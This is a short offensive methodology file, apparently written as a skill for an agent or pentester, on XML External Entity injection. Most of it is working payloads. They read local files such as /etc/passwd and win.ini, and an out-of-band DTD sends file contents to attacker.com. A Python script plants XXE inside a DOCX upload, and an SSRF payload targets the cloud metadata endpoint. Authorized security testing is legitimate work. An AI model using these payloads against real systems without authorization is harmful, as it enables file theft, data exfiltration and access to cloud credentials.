---
name: xxe
description: XML External Entity injection expert methodology. Covers classic XXE, blind OOB XXE, XXE via file upload, XXE to SSRF, and XXE in PDF/DOCX parsers.
version: 1.0.0
license: Apache-2.0
---

# XML External Entity (XXE) Injection

## Detection

Inject a custom DOCTYPE with an external entity reference:

```xml
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://burpcollaborator.net">]>
<root>&xxe;</root>
```

If the collaborator receives a DNS/HTTP callback: XXE confirmed.

## Classic XXE (Local File Read)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

```xml
<!-- Windows -->
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
```

## Blind XXE (OOB via DTD)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd"> %xxe;]>
<foo>bar</foo>
```

**malicious.dtd** (hosted on attacker.com):
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
```

## XXE via File Upload

Test XML-based file formats: DOCX, XLSX, PPTX, SVG, ODT, RSS.

```python
# DOCX = zip containing XML files — inject XXE into word/document.xml
import zipfile, shutil, os

shutil.copy('normal.docx', 'xxe.docx')
with zipfile.ZipFile('xxe.docx', 'a') as z:
    z.writestr('word/document.xml',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>')
```

## XXE to SSRF

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
```

## Tools

- Burp Suite — active scanner detects XXE
- [XXEInjector](https://github.com/enjoiz/XXEinjector) — automated XXE exfiltration
- [DTD cheat sheet](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity) — HackTricks reference

## OWASP Mapping

- A05:2021 — Security Misconfiguration (XML parser hardening)
